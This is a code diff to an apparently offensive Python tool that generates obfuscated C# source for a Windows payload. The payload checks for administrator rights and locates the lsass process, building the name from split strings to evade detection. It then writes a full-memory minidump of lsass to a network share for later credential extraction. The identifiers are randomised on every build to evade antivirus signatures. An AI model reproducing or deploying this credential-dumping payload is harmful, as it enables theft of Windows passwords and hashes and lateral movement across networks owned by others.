@@ -819,6 +819,24 @@ def do_ip(inpu, local_ip):  # check if the inputted ips are up so we dont scan t
     return uphosts
 
 def gen_payload_exe_mdwd(share_name, payload_name, addresses_array, drive_letter):
+    MiniDumpWithDataSegs = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    MiniDumpWithFullMemory = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    MiniDumpWithHandleData = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    MiniDumpWithThreadInfo = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    MiniDumpWithTokenInformation = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 25)))
+    filename = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    bRet = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    dumpTyp = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    prochandle = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    procid = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    Dump = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    GetPID = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    processes = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    id = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    p = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    l = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    s = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    a = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     addresses_file = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     namespace = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     Program = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
@@ -830,6 +848,7 @@ def gen_payload_exe_mdwd(share_name, payload_name, addresses_array, drive_letter
     i = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     thismachinesip = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     fs = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+
     exe_payload = ''
     exe_payload += 'using System;\n'
     exe_payload += 'using System.IO;\n'
@@ -846,55 +865,93 @@ def gen_payload_exe_mdwd(share_name, payload_name, addresses_array, drive_letter
     exe_payload += '{\n'
     exe_payload += '    class %s\n' % (Program)
     exe_payload += '    {\n'
-    exe_payload += '        [DllImport("dbghelp.dll", EntryPoint = "MiniDumpWriteDump", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]\n'
-    exe_payload += '        static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, SafeHandle OutFile, uint dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);\n'
-    exe_payload += '\n'
 
-    exe_payload += '        public static bool %s()\n' % (IsAdministrator)
+    exe_payload += "		public enum Typ : uint\n"
+    exe_payload += "        {\n"
+    exe_payload += "            %s = 0x00000001,\n" % (MiniDumpWithDataSegs)
+    exe_payload += "            %s = 0x00000002,\n" % (MiniDumpWithFullMemory)
+    exe_payload += "            %s = 0x00000004,\n" % (MiniDumpWithHandleData)
+    exe_payload += "            %s = 0x00001000,\n" % (MiniDumpWithThreadInfo)
+    exe_payload += "            %s = 0x00040000,\n" % (MiniDumpWithTokenInformation)
+    exe_payload += "        };\n"
+
+    exe_payload += "        [System.Runtime.InteropServices.DllImport(\"dbghelp.dll\",\n"
+    exe_payload += "              EntryPoint = \"MiniDumpWriteDump\",\n"
+    exe_payload += "              CallingConvention = CallingConvention.StdCall,\n"
+    exe_payload += "              CharSet = CharSet.Unicode,\n"
+    exe_payload += "              ExactSpelling = true, SetLastError = true)]\n"
+    exe_payload += "        static extern bool MiniDumpWriteDump(\n"
+    exe_payload += "              IntPtr hProcess,\n"
+    exe_payload += "              uint processId,\n"
+    exe_payload += "              IntPtr hFile,\n"
+    exe_payload += "              uint dumpType,\n"
+    exe_payload += "              IntPtr expParam,\n"
+    exe_payload += "              IntPtr userStreamParam,\n"
+    exe_payload += "              IntPtr callbackParam);\n"
+
+    exe_payload += "        public static bool %s(string %s, Typ %s, IntPtr %s, uint %s)\n" % (Dump, filename, dumpTyp, prochandle, procid)
+    exe_payload += "        {\n"
+    exe_payload += "            using (var %s = new System.IO.FileStream(%s, System.IO.FileMode.Create, System.IO.FileAccess.Write, System.IO.FileShare.None))\n" % (fs, filename)
+    exe_payload += "            {\n"
+    exe_payload += "                bool %s = MiniDumpWriteDump(\n" % (bRet)
+    exe_payload += "                  %s,\n" % (prochandle)
+    exe_payload += "                  %s,\n" % (procid)
+    exe_payload += "                  %s.SafeFileHandle.DangerousGetHandle(),\n" % (fs)
+    exe_payload += "                  (uint)%s,\n" % (dumpTyp)
+    exe_payload += "                  IntPtr.Zero,\n"
+    exe_payload += "                  IntPtr.Zero,\n"
+    exe_payload += "                  IntPtr.Zero);\n"
+    exe_payload += "                if (!%s)\n" % (bRet)
+    exe_payload += "                {\n"
+    exe_payload += "                    throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());\n"
+    exe_payload += "                }\n"
+    exe_payload += "                return %s;\n" % (bRet)
+    exe_payload += "            }\n"
+    exe_payload += "        }\n"
+
+    exe_payload += "        public static int %s() {\n" % (GetPID)
+    exe_payload += "            string %s = \"s\";\n" % (s)
+    exe_payload += "            string %s = \"l\";\n" % (l)
+    exe_payload += "            string %s = \"a\";\n" % (a)
+    exe_payload += "            var %s = System.Diagnostics.Process.GetProcessesByName(%s + %s + %s + %s + %s);\n" % (processes, l, s, a, s, s)
+    exe_payload += "            var %s = 0;\n" % (id)
+    exe_payload += "            foreach (var %s in %s)\n" % (process, processes)
+    exe_payload += "            {\n"
+    exe_payload += "                %s = %s.Id;\n" % (id, process)
+    exe_payload += "            }\n"
+
+    exe_payload += "            return %s;\n" % (id)
+    exe_payload += "        }\n"
+
+    exe_payload += "        public static bool %s()\n" % (IsAdministrator)
+    exe_payload += "        {\n"
+    exe_payload += "            return (new WindowsPrincipal(WindowsIdentity.GetCurrent()))\n"
+    exe_payload += "                      .IsInRole(WindowsBuiltInRole.Administrator);\n"
+    exe_payload += "        }\n"
+
+    exe_payload += '        static void Main(string[] args)\n'
     exe_payload += '        {\n'
-    exe_payload += '            return (new WindowsPrincipal(WindowsIdentity.GetCurrent()))\n'
-    exe_payload += '                      .IsInRole(WindowsBuiltInRole.Administrator);\n'
-    exe_payload += '        }\n'
+    exe_payload += "            if (%s())\n" % (IsAdministrator)
+    exe_payload += "            {\n"
+    exe_payload += "                var %s = System.IO.File.ReadLines(\"%s:\\\\%s.txt\").ToArray();\n" % (lines, drive_letter, addresses_file)
+    exe_payload += "                string %s = \"\";\n" % (thismachinesip)
+    exe_payload += "                var %s = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());\n" % (ipEntry)
+    exe_payload += "                foreach (var %s in %s.AddressList)\n" % (ip, ipEntry)
+    exe_payload += "                {\n"
+    exe_payload += "                    for (int %s = 0; %s < %s.Length; %s++)\n" % (i, i, lines, i)
+    exe_payload += "                    {\n"
+    exe_payload += "                        if (%s.ToString() == %s[%s].ToString())\n" % (ip, lines, i)
+    exe_payload += "                        {\n"
+    exe_payload += "                            %s = \"-\" + %s.ToString();\n" % (thismachinesip, ip)
+    exe_payload += "                        }\n"
+    exe_payload += "                    }\n"
+    exe_payload += "                }\n"
 
-    exe_payload += '        static int Main(string[] args)\n'
-    exe_payload += '        {\n'
-    exe_payload += '            if (%s() == false)\n' % (IsAdministrator)
-    exe_payload += '            {\n'
-    exe_payload += '                Console.WriteLine("not runnin as admin");\n'
-    exe_payload += '                return 0;\n'
-    exe_payload += '            }\n'
+    exe_payload += "                string filePath = \"%s:\\\\\" + System.Net.Dns.GetHostName() + %s + \".dmp\";\n" % (drive_letter, thismachinesip)
+    exe_payload += "                Process %s = Process.GetProcessById(%s());\n" % (p, GetPID)
+    exe_payload += "                %s(filePath, (Typ.%s | Typ.%s | Typ.%s | Typ.%s | Typ.%s), %s.Handle, (uint)%s.Id);\n" % (Dump, MiniDumpWithFullMemory, MiniDumpWithDataSegs, MiniDumpWithHandleData, MiniDumpWithThreadInfo, MiniDumpWithTokenInformation, p, p)
 
-    exe_payload += '                var %s = System.IO.File.ReadLines("%s:\\\\%s.txt").ToArray();\n' % (lines, drive_letter, addresses_file)
-    exe_payload += '                string %s = "";\n' % (thismachinesip)
-    exe_payload += '                var %s = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());\n' % (ipEntry)
-    exe_payload += '                foreach (var %s in %s.AddressList)\n' % (ip, ipEntry)
-    exe_payload += '                {\n'
-    exe_payload += '                    for (int %s = 0; %s < %s.Length; %s++)\n' % (i, i, lines, i)
-    exe_payload += '                    {\n'
-    exe_payload += '                        if (%s.ToString() == %s[%s].ToString())\n' % (ip, lines, i)
-    exe_payload += '                        {\n'
-    exe_payload += '                            %s = "-" + %s.ToString();\n' % (thismachinesip, ip)
-    exe_payload += '                        }\n'
-    exe_payload += '                    }\n'
-    exe_payload += '                }\n'
-
-    exe_payload += '            try\n'
-    exe_payload += '            {\n'
-    exe_payload += '                Process[] %s = Process.GetProcessesByName("l" + "sa" + "ss");\n' % (process)
-    exe_payload += '                using (FileStream %s = new FileStream("%s:\\\\" + System.Net.Dns.GetHostName() + %s +".dmp", FileMode.Create, FileAccess.ReadWrite, FileShare.Write))\n' % (fs, drive_letter, thismachinesip)
-    exe_payload += '                {\n'
-    exe_payload += '                    bool b = MiniDumpWriteDump(%s[0].Handle, (uint)%s[0].Id, %s.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);\n' % (process, process, fs)
-    exe_payload += '                    if (!b){\n'
-    exe_payload += '                        throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());\n'
-    exe_payload += '                    }\n'
-    exe_payload += '                }\n'
-    exe_payload += '            }\n'
-    exe_payload += '            catch (Exception)\n'
-    exe_payload += '            {\n'
-    exe_payload += '                Console.WriteLine("Error happened");\n'
-    exe_payload += '                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());\n'
-    exe_payload += '            }\n'
-    exe_payload += '            return 0;'
+    exe_payload += "            }\n"
 
     exe_payload += '        }\n'
     exe_payload += '    }\n'  # end of class
